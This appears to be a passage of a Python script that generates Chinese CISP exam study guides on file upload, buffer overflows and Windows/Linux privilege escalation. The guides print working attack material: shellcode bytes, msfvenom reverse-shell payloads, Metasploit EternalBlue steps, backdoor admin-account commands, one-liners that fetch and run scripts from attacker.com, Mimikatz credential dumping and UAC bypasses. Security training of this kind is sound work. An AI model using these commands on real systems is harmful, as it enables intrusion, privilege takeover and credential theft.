| "getimagesize()能完全防上传" | ❌ 错误！仅检查文件头，不检查文件内容 |
| "前端验证就够了" | ❌ 严重错误！前端验证仅影响用户体验 |

---

## 学习建议

1. 🧪 **搭建上传实验环境**：使用Upload-Labs靶场，从Level 1到Level 20逐关练习
2. 🔍 **理解每种验证机制**：不只是知道怎么绕过，更要理解为什么能绕过
3. 📝 **收集WebShell库**：建立多语言、多场景的WebShell武器库
4. 🛡️ **学习安全上传实现**：了解白名单+重命名+内容检测的正确实现
5. 🔗 **掌握组合攻击**：文件上传+文件包含+LFI的组合威力巨大

---

> **文件上传是Web安全的"临门一脚"——前面所有的信息收集和漏洞发现，最终都可能通过一个文件上传转化为服务器的完全控制权。掌握了文件上传绕过，你就掌握了通往服务器的"万能钥匙"。**
""")

# ===================================================================
# Day 14：缓冲区溢出基础
# ===================================================================
gen('day-14.md', """# Day 14：缓冲区溢出基础

> **📘 文档定位**：CISP 考试核心基础 | 难度：高级 | 预计阅读：50 分钟
>
> 缓冲区溢出（Buffer Overflow）是最经典、最底层的软件安全漏洞。从1988年的Morris蠕虫到2017年的EternalBlue（CVE-2017-0144/MS17-010），缓冲区溢出一直是最危险的漏洞类型。理解缓冲区溢出，是进入二进制安全领域的敲门砖。

---

## 导航目录

- [一、缓冲区溢出原理](#一缓冲区溢出原理)
- [二、栈溢出基础](#二栈溢出基础)
- [三、Shellcode编写基础](#三shellcode编写基础)
- [四、EIP控制技术](#四eip控制技术)
- [五、经典漏洞分析](#五经典漏洞分析)
- [六、SEH溢出](#六seh溢出)
- [七、整数溢出](#七整数溢出)
- [八、格式化字符串漏洞](#八格式化字符串漏洞)
- [九、防御机制与绕过](#九防御机制与绕过)
- [十、高分考点与知识巧记](#十高分考点与知识巧记)

---

## 一、缓冲区溢出原理

### 1.1 什么是缓冲区溢出

缓冲区溢出（Buffer Overflow）是指程序向缓冲区写入的数据超过了缓冲区的容量，导致相邻内存区域被覆盖：

```c
// 漏洞代码示例
#include <string.h>

void vulnerable(char *input) {
    char buffer[64];
    strcpy(buffer, input);  // 危险！没有长度检查
}

int main(int argc, char *argv[]) {
    vulnerable(argv[1]);
    return 0;
}
// 如果input长度 > 64字节，会覆盖buffer后面的内存
// 包括返回地址（EIP）
```

### 1.2 进程内存布局

```
进程内存布局（32位）：
高地址
+-------------------------+ 0xFFFFFFFF
|        Kernel Space      |
+-------------------------+ 0xC0000000
|          Stack           | ← ESP指向栈顶
|     （向下增长 ↓）        |    局部变量、函数参数、返回地址
+-------------------------+
|           ↓              |
|        未使用空间         |
|           ↑              |
+-------------------------+
|          Heap            | ← 动态分配的内存（向上增长 ↑）
+-------------------------+
|     BSS (未初始化数据)    |
+-------------------------+
|     Data (已初始化数据)   |
+-------------------------+
|     Text (代码段)        |
+-------------------------+ 0x08048000
低地址
```

### 1.3 栈帧结构

```
函数调用时的栈帧：
          +----------------+
ESP+... → | 局部变量2       |
          +----------------+
ESP+... → | 局部变量1       | ← buffer[64] 在这里
          +----------------+
EBP+4  →  | 返回地址(EIP)   | ← 攻击目标
          +----------------+
EBP+8  →  | 参数1           |
          +----------------+
EBP+12 →  | 参数2           |
          +----------------+
```

> **🔑 高分考点**：缓冲区溢出的核心目标是**覆盖返回地址（EIP）**，使程序跳转到攻击者控制的代码（Shellcode）。

---

## 二、栈溢出基础

### 2.1 栈溢出利用步骤

```
栈溢出利用五步法：
1. 确定溢出点（缓冲区大小）
2. 确定偏移量（缓冲区到EIP的距离）
3. 控制EIP（覆盖为预期地址）
4. 放置Shellcode
5. 跳转到Shellcode执行
```

### 2.2 确定偏移量

```bash
# 方法1：使用Metasploit pattern
# 生成pattern
msf-pattern_create -l 1000
# 运行程序，观察崩溃时的EIP值
# 计算偏移
msf-pattern_offset -q 0x41366541
# 输出：Exact match at offset 76
# 说明：buffer[76]之后就是EIP

# 方法2：手动二分法
# 发送不同长度的'A'，观察EIP被覆盖的临界点

# 方法3：使用mona.py（Immunity Debugger）
!mona pattern_create 1000
# 运行后
!mona pattern_offset EIP值
# 或
!mona findmsp
```

### 2.3 Immunity Debugger 使用

```bash
# Immunity Debugger 基础操作
# 1. 加载程序：File → Open → 选择.exe
# 2. 运行：F9 (Run)
# 3. 附加到进程：File → Attach
# 4. 设置断点：F2
# 5. 单步执行：F7 (Step Into) / F8 (Step Over)
# 6. 查看寄存器：View → Registers
# 7. 查看内存：View → Memory
# 8. 查看栈：View → Stack

# mona.py 配置
# 将mona.py放入 PyCommands 目录
# 命令：
!mona modules          # 查看模块信息
!mona findmsp          # 自动找偏移
!mona jmp -r esp       # 找 JMP ESP 指令
!mona seh              # SEH链信息
```

---

## 三、Shellcode编写基础

### 3.1 基础Shellcode

```assembly
; Linux x86 execve("/bin/sh", NULL, NULL) Shellcode
; 长度：23字节
section .text
global _start
_start:
    xor eax, eax
    push eax                      ; 字符串终止符
    push 0x68732f2f              ; "//sh"
    push 0x6e69622f              ; "/bin"
    mov ebx, esp                  ; ebx = "/bin//sh"
    xor ecx, ecx                  ; ecx = NULL
    xor edx, edx                  ; edx = NULL
    mov al, 0xb                   ; execve系统调用号
    int 0x80

; 编译：
; nasm -f elf32 shell.asm -o shell.o
; ld -m elf_i386 shell.o -o shell

; 提取Shellcode：
; objdump -d shell | grep -Po '\\s\\K[0-9a-f]{2}(?=\\s)' | sed 's/^/\\\\x/g' | tr -d '\\n'
```

### 3.2 常用Shellcode

```python
# Windows MessageBox Shellcode
# 弹出消息框（用于验证溢出）
messagebox = (
    b"\\xd9\\xeb\\x9b\\xd9\\x74\\x24\\xf4\\x31\\xd2\\xb2\\x77\\x31\\xc9"
    b"\\x64\\x8b\\x71\\x30\\x8b\\x76\\x0c\\x8b\\x76\\x1c\\x8b\\x46\\x08"
    b"\\x8b\\x7e\\x20\\x8b\\x36\\x38\\x4f\\x18\\x75\\xf3\\x59\\x01\\xd1"
    # ... 
)

# Linux /bin/sh Shellcode
linux_shell = (
    b"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69"
    b"\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"
)

# Windows Reverse Shell (msfvenom)
# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f python
```

### 3.3 msfvenom生成Shellcode

```bash
# Linux Shellcode
msfvenom -p linux/x86/exec CMD=/bin/sh -f python
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f c

# Windows Shellcode
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f python -b '\\x00\\x0a\\x0d'
msfvenom -p windows/exec CMD="calc.exe" -f python

# 排除坏字符
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f python -b '\\x00\\x0a\\x0d\\x1a'

# 编码
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f python

# 多平台Shellcode
msfvenom --list payloads | grep reverse_tcp
```

---

## 四、EIP控制技术

### 4.1 JMP ESP技术

```bash
# 原理：EIP被覆盖后，ESP指向攻击者数据
# 找一条 JMP ESP 或 CALL ESP 指令，将EIP指向该指令
# 执行流：EIP → JMP ESP → ESP(Shellcode)

# mona查找 JMP ESP
!mona jmp -r esp
# 或
!mona find -s "\\xff\\xe4" -m module.dll

# 手动查找
# 在Immunity中搜索命令：\\xff\\xe4 (JMP ESP)

# 注意选择：
# 1. 地址中不含坏字符（\\x00, \\x0a, \\x0d）
# 2. 地址稳定（非ASLR模块）
# 3. 地址属于可执行模块
```

### 4.2 坏字符处理

```python
# 坏字符检测
badchars = (
    b"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10"
    b"\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20"
    b"\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30"
    b"\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40"
    b"\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50"
    b"\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60"
    b"\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70"
    b"\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80"
    b"\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90"
    b"\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0"
    b"\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\x47\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0"
    b"\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0"
    b"\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0"
    b"\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0"
    b"\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0"
    b"\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff"
)
# 在内存中检查哪些字符被截断或修改
```

---

## 五、经典漏洞分析

### 5.1 MS17-010 EternalBlue (CVE-2017-0144)

```bash
# EternalBlue是NSA泄露的SMBv1漏洞利用
# 影响：Windows XP/7/2003/2008/8/10等

# 漏洞原理：
# SMBv1处理FeaList转换时，对输入大小计算错误
# 导致缓冲区溢出，可以执行任意代码

# 利用（Metasploit）
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444
exploit

# 检测脚本
nmap -p 445 --script smb-vuln-ms17-010 192.168.1.0/24
```

### 5.2 CVE-2019-0708 BlueKeep

```bash
# BlueKeep - RDP远程桌面漏洞
# 影响：Windows 7/2008 R2及以下

# 漏洞原理：
# RDP的termdd.sys驱动在处理虚拟通道时存在Use-After-Free
# 攻击者可发送特制RDP请求触发

# 检测
nmap -p 3389 --script rdp-vuln-ms12-020 192.168.1.100
# Metasploit
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
set RHOSTS 192.168.1.100
run
```

---

## 六、SEH溢出

### 6.1 SEH溢出原理

SEH（Structured Exception Handler）是Windows的结构化异常处理机制。当程序发生异常时，系统遍历SEH链寻找处理函数：

```
SEH链结构：
TEB → ExceptionList → SEH Record 1 → SEH Record 2 → ... → FFFFFFFF

每个SEH Record：
+0x00: Next SEH Record 指针
+0x04: Exception Handler 函数指针
```

```bash
# SEH溢出利用
# 1. 溢出覆盖栈上的SEH Record
# 2. 将Next指针覆盖为 \\xEB\\x06\\x90\\x90 (短跳转)
# 3. 将Handler指针覆盖为 POP POP RET 指令地址
# 4. 异常触发后，执行流：
#    Handler → POP POP RET → Next Record(短跳转) → Shellcode

# mona找POP POP RET
!mona seh
# 选择不包含SafeSEH的模块
```

---

## 七、整数溢出

### 7.1 整数溢出类型

```c
// 1. 整数上溢（Integer Overflow）
unsigned short a = 65535;
a = a + 1;  // a = 0 (溢出回绕)

// 2. 整数下溢（Integer Underflow）
unsigned short b = 0;
b = b - 1;  // b = 65535

// 3. 符号错误（Signedness Error）
int size = atoi(argv[1]);
if (size < 256) {
    memcpy(buf, src, size);  // size为负数时绕过检查
}

// 4. 截断错误（Truncation）
unsigned short s = 0x10000;  // s = 0 (高16位被截断)
```

### 7.2 整数溢出利用

```bash
# 经典案例：OpenSSH CRC32补偿攻击
# CVE-2001-0144
# 一个16位无符号整数被用于检测malloc大小
# 但实际接收的数据量由32位变量决定
# 导致堆溢出

# 利用思路：
# 1. 找到整数运算错误的位置
# 2. 使计算结果小于预期（如0或极小值）
# 3. 绕过长度检查
# 4. 后续操作导致缓冲区溢出
```

---

## 八、格式化字符串漏洞

### 8.1 格式化字符串原理

```c
// 漏洞代码
void vulnerable(char *input) {
    printf(input);  // 危险！应该用 printf("%s", input)
}

// 攻击：
// 输入：%x %x %x %x  → 泄露栈数据
// 输入：%n → 写入任意地址
// 输入：AAAA%x%x%x%x%x%x%x%x%n → 修改任意内存
```

### 8.2 格式化字符串利用

```bash
# 格式化字符串攻击能力：
# 1. 读取栈数据：%x, %lx, %p
# 2. 读取任意地址：%s (配合栈上的地址)
# 3. 写入任意地址：%n, %hn, %hhn

# 利用步骤：
# 1. 找到输入在栈上的偏移
AAAA%x.%x.%x.%x.%x.%x.%x
# 当看到 0x41414141 时，知道偏移

# 2. 使用%n写入
# %n：写入4字节（int）
# %hn：写入2字节（short）
# %hhn：写入1字节（byte）- 最常用

# 3. 覆盖GOT表或返回地址
# 实现代码执行
```

---

## 九、防御机制与绕过

### 9.1 防御机制

| 机制 | 描述 | 绕过方法 |
|:---|:---|:---|
| ASLR | 地址空间布局随机化 | 信息泄露、部分覆盖、暴力破解 |
| DEP/NX | 数据执行保护 | ROP、JIT Spraying |
| Stack Canary | 栈金丝雀（栈保护） | 信息泄露、覆盖Canary |
| SafeSEH | SEH保护 | 使用未启用SafeSEH的模块 |
| RELRO | 重定位只读 | 部分RELRO可绕过 |
| PIE | 位置无关可执行文件 | 信息泄露基址 |

### 9.2 ROP（Return-Oriented Programming）

```bash
# ROP是利用已有代码片段（gadget）构建攻击链
# 绕过DEP/NX

# gadget示例：
# pop eax; ret
# pop ebx; ret
# mov [eax], ebx; ret

# ROP链构建：
# 1. 使用ROPgadget搜索gadget
ROPgadget --binary program.exe
ROPgadget --binary program.exe --ropchain

# 2. 常见ROP链目标
# - VirtualProtect → 修改内存为可执行
# - WriteProcessMemory → 写入Shellcode
# - system() → 执行系统命令
```

---

## 十、高分考点与知识巧记

### 📌 高分考点速查表

| 序号 | 考点 | 考试频率 | 难度 | 关键答案 |
|:---:|:---|:---:|:---:|:---|
| 1 | 缓冲区溢出定义 | ★★★★★ | ★ | 写入超缓冲区容量，覆盖相邻内存 |
| 2 | 栈溢出目标 | ★★★★★ | ★★ | 覆盖返回地址(EIP)控制执行流 |
| 3 | Shellcode | ★★★★ | ★★ | 用于执行攻击者意图的机器码 |
| 4 | JMP ESP | ★★★★ | ★★ | 跳转到栈顶执行Shellcode |
| 5 | 坏字符 | ★★★ | ★★ | 导致Shellcode被截断的字符 |
| 6 | ASLR | ★★★★ | ★★ | 地址空间布局随机化 |
| 7 | DEP/NX | ★★★★ | ★★ | 数据执行保护 |
| 8 | ROP | ★★★ | ★★★ | 利用gadget绕过DEP |
| 9 | SEH溢出 | ★★★ | ★★★ | 覆盖异常处理函数指针 |
| 10 | 格式化字符串 | ★★★★ | ★★ | %n写入任意地址 |

### 💡 知识巧记口诀

> **"溢出五步"** — 找溢出点、定偏移量、控EIP、放Shellcode、跳转执行。记住：**"找定控放跳"**。

> **"防御三件套"** — ASLR（随机化）、DEP（不可执行）、Canary（栈金丝雀）。记住：**"随不行栈"**——随机化、不可执行、栈保护。

> **"坏字符排除"** — 0x00（字符串终止）、0x0a（换行）、0x0d（回车）。记住：**"空换回"**。

### 🎯 考试陷阱提醒

| 陷阱 | 正确理解 |
|:---|:---|
| "DEP能防止所有溢出攻击" | ❌ 错误！ROP可绕过DEP |
| "ASLR使地址完全不可预测" | ❌ 错误！部分模块可能未启用ASLR |
| "Stack Canary不可绕过" | ❌ 错误！信息泄露或爆破可绕过 |
| "格式化字符串只能读数据" | ❌ 错误！%n可以写入任意内存地址 |

---

## 学习建议

1. 🧪 **搭建溢出实验环境**：Windows 7 32位 + Immunity Debugger + mona.py
2. 📚 **从简单开始**：先学习无保护机制的栈溢出，再逐步加入ASLR/DEP
3. 🔧 **精通msfvenom**：熟练生成各种平台和类型的Shellcode
4. 🧠 **理解内存布局**：这是缓冲区溢出的基础
5. 🛡️ **同时学习防御**：理解每种防御机制的原理和绕过方法

---

> **缓冲区溢出是"黑客的微积分"——它要求你理解程序的每一个字节、每一个寄存器、每一个内存地址。掌握缓冲区溢出，你就真正理解了计算机如何运行。**
""")

print("\nDays 1-14 done, continuing with days 15-25...")

# ===================================================================
# Day 15：系统权限提升思路
# ===================================================================
gen('day-15.md', """# Day 15：系统权限提升思路

> **📘 文档定位**：CISP 考试核心基础 | 难度：中级 | 预计阅读：45 分钟
>
> 权限提升（Privilege Escalation）是渗透测试中最关键的环节之一。大多数初始攻击获得的都是低权限（如Web服务用户），要将攻击影响最大化，必须将权限提升至管理员/root。本章将系统性地介绍Windows和Linux的权限提升思路与技术。

---

## 导航目录

- [一、权限提升概述](#一权限提升概述)
- [二、Windows信息收集](#二windows信息收集)
- [三、Windows内核漏洞提权](#三windows内核漏洞提权)
- [四、Windows服务配置不当提权](#四windows服务配置不当提权)
- [五、Windows计划任务提权](#五windows计划任务提权)
- [六、Windows凭据窃取提权](#六windows凭据窃取提权)
- [七、UAC绕过技术](#七uac绕过技术)
- [八、Linux提权概述](#八linux提权概述)
- [九、提权自动化工具](#九提权自动化工具)
- [十、高分考点与知识巧记](#十高分考点与知识巧记)

---

## 一、权限提升概述

### 1.1 什么是权限提升

权限提升分为垂直提权（低权限→高权限，如user→root）和水平提权（用户A→用户B）：

```
权限提升类型：
垂直提权：普通用户 → Administrator/root
水平提权：用户A → 用户B
跨域提权：子域用户 → 域管理员
```

### 1.2 提权攻击面

| 分类 | Windows | Linux |
|:---|:---|:---|
| 内核漏洞 | MS16-032, MS15-051 | DirtyCow, DirtyPipe |
| 服务配置 | 未引号服务路径, 弱服务权限 | Cron任务, Systemd服务 |
| 凭据窃取 | Mimikatz, 注册表, 配置文件 | /etc/shadow, SSH密钥, 历史文件 |
| 文件权限 | 可写DLL, 可写EXE | SUID, Sudo配置, 可写脚本 |
| 计划任务 | schtasks | Cron, systemd timer |
| 特权滥用 | SeImpersonate, SeDebug | capabilities, Sudo |

> **🔑 高分考点**：权限提升的三个核心步骤——**信息收集**（了解系统）、**漏洞识别**（找到提权路径）、**漏洞利用**（执行提权）。

---

## 二、Windows信息收集

### 2.1 系统基础信息

```powershell
# 系统信息
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Hotfix"

# 查看已安装补丁
wmic qfe get Caption,Description,HotFixID,InstalledOn
wmic qfe list brief

# 查看环境变量
set
Get-ChildItem Env:

# 查看网络信息
ipconfig /all
route print
arp -a
netstat -ano

# 查看防火墙
netsh firewall show state
netsh advfirewall show allprofiles
```

### 2.2 用户与权限

```powershell
# 当前用户
whoami
whoami /priv
whoami /groups
echo %USERNAME%

# 本地用户
net user
net user administrator
net localgroup
net localgroup administrators

# 域信息
net user /domain
net group /domain
net group "Domain Admins" /domain

# 查看当前登录用户
query user
qwinsta
```

### 2.3 进程与服务

```powershell
# 进程信息
tasklist /svc
tasklist /v
wmic process list brief

# 服务信息
sc query state= all
wmic service list brief
Get-Service | Select Name, Status, StartType

# 查找以高权限运行的服务
wmic service get name,displayname,pathname,startmode,startname | findstr /i "LocalSystem"
```

### 2.4 计划任务

```powershell
# 查看计划任务
schtasks /query /fo LIST /v
Get-ScheduledTask | where {$_.TaskPath -notlike "\\Microsoft*"} | ft TaskName,State

# 查看启动项
wmic startup get caption,command
reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
```

---

## 三、Windows内核漏洞提权

### 3.1 补丁对比

```bash
# 方法1：systeminfo + 手动对比
systeminfo > sysinfo.txt
# 在Kali上对比
python3 windows-exploit-suggester.py --database 2023-01-01-mssb.xls --systeminfo sysinfo.txt

# 方法2：Watson
Watson.exe

# 方法3：Sherlock (PowerShell)
Import-Module .\\Sherlock.ps1
Find-AllVulns

# 方法4：WinPEAS
winPEASany.exe quiet systeminfo
```

### 3.2 经典内核漏洞

```powershell
# MS16-032 (Secondary Logon Handle)
# 影响：Windows 7/8.1/10, 2008/2012
Invoke-MS16032 -Command "cmd /c net user hacker P@ssw0rd /add && net localgroup administrators hacker /add"

# MS15-051 (ClientCopyImage Win32k)
# 影响：Windows 2003/2008/7/8
ms15-051.exe "net user hacker P@ssw0rd /add && net localgroup administrators hacker /add"

# CVE-2020-0787 (BitsArbitraryFileMove)
BitsArbitraryFileMove.exe

# MS14-058 (Win32k.sys)
# 影响：Windows 2003/2008/2012/7/8

# CVE-2021-1732 (Win32k)
# 影响：Windows 10 1909/2004/20H2

# 使用Metasploit
use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
set SESSION 1
set LHOST 192.168.1.50
run
```

### 3.3 Potato系列提权

```bash
# RottenPotato / JuicyPotato
# 利用：SeImpersonate或SeAssignPrimaryToken特权
# CLSID触发COM对象提权

# JuicyPotato使用
JuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -a "/c whoami" -t *
JuicyPotato.exe -l 1337 -p shell.exe -t * -c {{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}}

# PrintSpoofer (利用SeImpersonate + 打印机)
PrintSpoofer.exe -i -c cmd
PrintSpoofer.exe -c "powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/rev.ps1')"

# RoguePotato
RoguePotato.exe -r 192.168.1.50 -e "cmd.exe" -l 9999

# SweetPotato
SweetPotato.exe -p cmd.exe -a "/c whoami"
```

---

## 四、Windows服务配置不当提权

### 4.1 未引号服务路径

```powershell
# 检测未引号服务路径
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\\Windows" | findstr /i /v '"'

# 示例：服务路径为 C:\\Program Files\\My App\\service.exe
# 系统会依次尝试：
# C:\\Program.exe
# C:\\Program Files\\My.exe
# C:\\Program Files\\My App\\service.exe

# 利用：
# 1. 将恶意程序放到 C:\\Program Files\\My.exe
# 2. 重启服务或等待重启
# 3. 以SYSTEM权限执行

# 检查写权限
icacls "C:\\Program Files\\My App"
accesschk.exe -wvu "C:\\Program Files\\My App"
```

### 4.2 服务权限配置错误

```powershell
# 使用AccessChk检查服务权限
accesschk.exe -uwcqv * 
accesschk.exe -uwcqv "VulnerableService"

# 可修改的服务配置
sc qc VulnerableService
sc config VulnerableService binPath= "C:\\shell.exe"
sc start VulnerableService

# 使用PowerUp
Import-Module .\\PowerUp.ps1
Get-ModifiableService
Invoke-AllChecks
```

### 4.3 AlwaysInstallElevated

```powershell
# 检测AlwaysInstallElevated配置
reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
# 如果两个都是 0x1，可以利用

# 利用：
msfvenom -p windows/exec CMD='net user hacker P@ssw0rd /add && net localgroup administrators hacker /add' -f msi -o evil.msi
msiexec /quiet /qn /i evil.msi
```

---

## 五、Windows计划任务提权

### 5.1 计划任务劫持

```powershell
# 查看计划任务
schtasks /query /fo LIST /v | findstr /i "TaskName"

# 检查计划任务执行文件的权限
icacls "C:\\Program Files\\Task\\script.bat"
accesschk.exe -wvu "C:\\Program Files\\Task"

# 如果有写权限
echo net user hacker P@ssw0rd /add > "C:\\Program Files\\Task\\script.bat"
echo net localgroup administrators hacker /add >> "C:\\Program Files\\Task\\script.bat"
```

### 5.2 DLL劫持

```powershell
# 检测DLL劫持机会
# 1. 找到以SYSTEM运行的程序
# 2. 检查程序加载的DLL
# 3. 确认DLL搜索路径中是否有可写目录

# 使用ProcMon检测
# 筛选：Result = NAME NOT FOUND

# 生成恶意DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f dll -o hijack.dll
```

---

## 六、Windows凭据窃取提权

### 6.1 配置文件中的密码

```powershell
# 搜索常见配置文件
dir /s /b *pass* == *cred* == *config* == *.ini == *.conf
findstr /si password *.xml *.ini *.txt *.config *.cfg

# 搜索Unattend文件
dir /s /b C:\\unattend.xml
dir /s /b C:\\Windows\\Panther\\Unattend.xml
dir /s /b C:\\Windows\\Panther\\Unattend\\Unattend.xml

# 搜索Sysprep文件
dir /s /b C:\\Windows\\System32\\sysprep\\unattend.xml

# 搜索Group Policy Preferences
findstr /S /I cpassword C:\\ProgramData\\Microsoft\\Group Policy\\History\\*
```

### 6.2 内存凭据提取

```powershell
# Procdump + Mimikatz
procdump.exe -accepteula -ma lsass.exe lsass.dmp
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords" exit

# 直接使用Mimikatz
mimikatz.exe "privilege::debug" "sekurlsa::logonPasswords" exit

# 使用PowerSploit
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonPasswords"'
```

---

## 七、UAC绕过技术

### 7.1 UAC级别

| 级别 | 值 | 描述 |
|:---|:---|:---|
| 始终通知 | 1 | 最高级别 |
| 默认 | 2 | 仅程序尝试更改时通知 |
| 不降低亮度 | 3 | 与2相同但不使用安全桌面 |
| 从不通知 | 0 | 完全禁用 |

```powershell
# 检查UAC级别
reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA
reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v ConsentPromptBehaviorAdmin
```

### 7.2 UAC绕过技术

```bash
# 方法1：fodhelper.exe (Windows 10)
# 修改注册表
reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /d "cmd.exe /c net user hacker P@ssw0rd /add && net localgroup administrators hacker /add" /f
reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /v DelegateExecute /t REG_SZ /d "" /f
fodhelper.exe

# 方法2：eventvwr.exe (Windows 7/8/10)
reg add HKCU\\Software\\Classes\\mscfile\\shell\\open\\command /d "cmd.exe /c calc.exe" /f
eventvwr.exe

# 方法3：Metasploit
use exploit/windows/local/bypassuac_fodhelper
use exploit/windows/local/bypassuac_eventvwr
set SESSION 1
run
```

---

## 八、Linux提权概述

### 8.1 Linux信息收集

```bash
# 系统信息
uname -a
cat /etc/issue
cat /etc/os-release
cat /proc/version
lscpu

# 用户信息
whoami
id
sudo -l
cat /etc/passwd
cat /etc/shadow

# 网络信息
ifconfig -a
ip a
netstat -anlp
ss -anlp

# 进程信息
ps aux
ps -ef
top -n 1

# 计划任务
crontab -l
ls -la /etc/cron*
cat /etc/crontab
```

### 8.2 SUID提权

```bash
# 查找SUID文件
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# 常见可利用SUID
# bash (如果bash -p保留特权)
# find
find / -name test -exec /bin/sh \\;
# vim
vim -c ':!/bin/sh'
# nmap (旧版本)
nmap --interactive → !sh
# less/more
less /etc/passwd → !/bin/sh
# cp
cp /bin/sh /tmp/sh && chmod +s /tmp/sh
```

### 8.3 Sudo配置不当

```bash
# 查看sudo权限
sudo -l

# 常见sudo提权
# 如果允许执行某些命令不需要密码
sudo /bin/bash
sudo su -
sudo -i

# 如果允许特定命令
# vim
sudo vim -c ':!/bin/sh'
# find
sudo find / -exec /bin/sh \\;
# awk
sudo awk 'BEGIN {{system("/bin/sh")}}'
# python
sudo python3 -c 'import os; os.system("/bin/sh")'
# nmap
echo "os.execute('/bin/sh')" > /tmp/script.nse && sudo nmap --script=/tmp/script.nse
```

### 8.4 内核漏洞

```bash
# DirtyCow (CVE-2016-5195)
# 影响：Linux Kernel < 4.8.3
gcc -pthread dirtycow.c -o dirtycow -lcrypt
./dirtycow

# DirtyPipe (CVE-2022-0847)
# 影响：Linux Kernel 5.8 - 5.16.11
./dirtypipe /etc/passwd 1 ootz:$(openssl passwd -1 password):0:0:root:/root:/bin/bash

# PwnKit (CVE-2021-4034)
# 影响：所有pkexec版本
./PwnKit

# sudoedit (CVE-2021-3156)
./exploit
```

---

## 九、提权自动化工具

### 9.1 Windows

```bash
# WinPEAS
winPEASany.exe

# PowerUp
Import-Module .\\PowerUp.ps1
Invoke-AllChecks

# PrivescCheck
Import-Module .\\PrivescCheck.ps1
Invoke-PrivescCheck

# Seatbelt
Seatbelt.exe -group=all

# JAWS
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/jaws-enum.ps1')"
```

### 9.2 Linux

```bash
# LinPEAS
./linpeas.sh

# LinEnum
./LinEnum.sh

# Linux Exploit Suggester
./linux-exploit-suggester.sh

# pspy (监控进程)
./pspy64

# LSE (Linux Smart Enumeration)
./lse.sh -l 2
```

---

## 十、高分考点与知识巧记

### 📌 高分考点速查表

| 序号 | 考点 | 考试频率 | 难度 | 关键答案 |
|:---:|:---|:---:|:---:|:---|
| 1 | 提权类型 | ★★★★ | ★ | 垂直提权(低→高)和水平提权(用户A→B) |
| 2 | Windows补丁对比 | ★★★★★ | ★★ | systeminfo + 漏洞数据库 |
